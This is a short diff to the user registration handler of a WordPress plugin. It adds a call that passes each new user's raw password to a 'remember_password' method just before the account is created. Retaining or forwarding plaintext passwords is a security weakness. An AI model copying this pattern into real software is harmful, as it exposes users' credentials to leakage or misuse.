@@ -172,6 +172,7 @@ if ( 'POST' === $_SERVER['REQUEST_METHOD'] ) {
 		} elseif ( email_exists( $email ) ) {
 			$register_error = __( 'Этот email уже зарегистрирован.', 'idpg_core' );
 		} else {
+			IDPG_Auth_Emails::remember_password( $email, $password );
 			$user_id = wp_create_user( $email, $password, $email );
 
 			if ( is_wp_error( $user_id ) ) {
